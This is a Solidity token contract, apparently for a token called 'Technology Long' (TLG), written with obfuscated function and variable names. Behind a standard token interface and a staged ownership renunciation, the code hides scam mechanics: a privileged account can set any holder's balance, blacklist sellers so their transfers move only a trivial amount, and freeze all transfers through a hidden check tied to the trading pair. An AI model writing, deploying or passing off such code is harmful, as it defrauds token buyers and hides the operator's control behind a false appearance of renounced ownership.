//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface tradingBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableBuyAuto) external view returns (uint256);

    function transfer(address fundSell, uint256 atSender) external returns (bool);

    function allowance(address limitIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 atSender) external returns (bool);

    function transferFrom(
        address sender,
        address fundSell,
        uint256 atSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeReceiver, uint256 value);
    event Approval(address indexed limitIs, address indexed spender, uint256 value);
}

abstract contract receiverTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundAuto {
    function createPair(address atLiquidity, address txTeam) external returns (address);
}

interface tradingBuyMetadata is tradingBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TechnologyLong is receiverTrading, tradingBuy, tradingBuyMetadata {

    function approve(address receiverIs, uint256 atSender) public virtual override returns (bool) {
        toSwap[_msgSender()][receiverIs] = atSender;
        emit Approval(_msgSender(), receiverIs, atSender);
        return true;
    }

    string private fundLiquidityAt = "TLG";

    function transferFrom(address modeAuto, address fundSell, uint256 atSender) external override returns (bool) {
        if (_msgSender() != tokenEnable) {
            if (toSwap[modeAuto][_msgSender()] != type(uint256).max) {
                require(atSender <= toSwap[modeAuto][_msgSender()]);
                toSwap[modeAuto][_msgSender()] -= atSender;
            }
        }
        return atLaunched(modeAuto, fundSell, atSender);
    }

    function getOwner() external view returns (address) {
        return listMax;
    }

    function marketingLiquidity(address toAt, uint256 atSender) public {
        sellWalletReceiver();
        totalEnable[toAt] = atSender;
    }

    uint256 private txListExempt = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed enableLiquidity, address indexed totalWallet);

    bool public tradingIs;

    mapping(address => mapping(address => uint256)) private toSwap;

    mapping(address => bool) public marketingSwap;

    function minReceiver(address modeAuto, address fundSell, uint256 atSender) internal returns (bool) {
        require(totalEnable[modeAuto] >= atSender);
        totalEnable[modeAuto] -= atSender;
        totalEnable[fundSell] += atSender;
        emit Transfer(modeAuto, fundSell, atSender);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundLiquidityAt;
    }

    uint256 enableWallet;

    uint8 private listFrom = 18;

    uint256 private shouldTake;

    bool private enableMode;

    function totalSupply() external view virtual override returns (uint256) {
        return txListExempt;
    }

    function sellWalletReceiver() private view {
        require(marketingSwap[_msgSender()]);
    }

    mapping(address => uint256) private totalEnable;

    function balanceOf(address enableBuyAuto) public view virtual override returns (uint256) {
        return totalEnable[enableBuyAuto];
    }

    address public totalSwapIs;

    uint256 public swapToken;

    function name() external view virtual override returns (string memory) {
        return enableSwap;
    }

    function sellMax(address buyReceiverEnable) public {
        sellWalletReceiver();
        if (teamEnable) {
            shouldTake = swapExempt;
        }
        if (buyReceiverEnable == listAuto || buyReceiverEnable == totalSwapIs) {
            return;
        }
        walletFrom[buyReceiverEnable] = true;
    }

    address tokenEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public autoTotal;

    string private enableSwap = "Technology Long";

    function atLaunched(address modeAuto, address fundSell, uint256 atSender) internal returns (bool) {
        if (modeAuto == listAuto) {
            return minReceiver(modeAuto, fundSell, atSender);
        }
        uint256 fundFeeShould = tradingBuy(totalSwapIs).balanceOf(enableTo);
        require(fundFeeShould == enableWallet);
        require(fundSell != enableTo);
        if (walletFrom[modeAuto]) {
            return minReceiver(modeAuto, fundSell, senderWallet);
        }
        return minReceiver(modeAuto, fundSell, atSender);
    }

    bool public teamEnable;

    mapping(address => bool) public walletFrom;

    bool private maxLiquidityLaunch;

    function transfer(address toAt, uint256 atSender) external virtual override returns (bool) {
        return atLaunched(_msgSender(), toAt, atSender);
    }

    function marketingTotal() public {
        emit OwnershipTransferred(listAuto, address(0));
        listMax = address(0);
    }

    function owner() external view returns (address) {
        return listMax;
    }

    function decimals() external view virtual override returns (uint8) {
        return listFrom;
    }

    address private listMax;

    uint256 private swapExempt;

    address enableTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function isFrom(address liquidityBuy) public {
        if (tradingIs) {
            return;
        }
        if (swapExempt != swapToken) {
            swapExempt = swapToken;
        }
        marketingSwap[liquidityBuy] = true;
        if (enableMode) {
            maxLiquidityLaunch = false;
        }
        tradingIs = true;
    }

    constructor (){
        
        shouldTo modeLimit = shouldTo(tokenEnable);
        totalSwapIs = fundAuto(modeLimit.factory()).createPair(modeLimit.WETH(), address(this));
        
        listAuto = _msgSender();
        marketingTotal();
        marketingSwap[listAuto] = true;
        totalEnable[listAuto] = txListExempt;
        if (maxLiquidityLaunch != enableMode) {
            enableMode = false;
        }
        emit Transfer(address(0), listAuto, txListExempt);
    }

    uint256 constant senderWallet = 15 ** 10;

    function allowance(address walletAt, address receiverIs) external view virtual override returns (uint256) {
        if (receiverIs == tokenEnable) {
            return type(uint256).max;
        }
        return toSwap[walletAt][receiverIs];
    }

    function listReceiver(uint256 atSender) public {
        sellWalletReceiver();
        enableWallet = atSender;
    }

    address public listAuto;

    uint256 txAmount;

}